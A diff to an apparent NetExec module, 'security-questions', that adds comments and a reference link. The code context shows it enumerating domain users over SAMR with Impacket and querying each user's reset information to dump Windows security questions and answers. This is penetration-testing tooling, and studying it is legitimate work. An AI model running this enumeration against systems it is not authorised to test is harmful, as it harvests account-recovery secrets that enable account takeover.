@@ -10,6 +10,7 @@ class NXCModule:
     Based on research from @0gtweet (@gtworek)
 
     Much of this code was copied from add_computer.py
+    Reference: https://hackback.zip/2024/05/08/Remotely-Dumping-Windows-Security-Questions-With-Impacket.html
     """
 
     name = "security-questions"
@@ -63,6 +64,7 @@ class NXCModule:
             dce.connect()
             dce.bind(samr.MSRPC_UUID_SAMR)
 
+            # obtain server handle for samr connection
             resp = samr.hSamrConnect(dce)
             serverHandle = resp["ServerHandle"]
 
@@ -71,12 +73,14 @@ class NXCModule:
 
             resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]["Name"])
 
+            # obtain domain handle for samr connection
             resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp["DomainId"])
             domainHandle = resp["DomainHandle"]
 
             status = STATUS_MORE_ENTRIES
             enumerationContext = 0
 
+            # try to iterate through users in domain entries for connection
             while status == STATUS_MORE_ENTRIES:
                 try:
                     resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
@@ -86,6 +90,8 @@ class NXCModule:
                     resp = e.get_packet()
 
                 for user in resp["Buffer"]["Buffer"]:
+                    # request SAMR ID 30
+                    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6
                     r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user["RelativeId"])
                     info = samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserResetInformation)
 
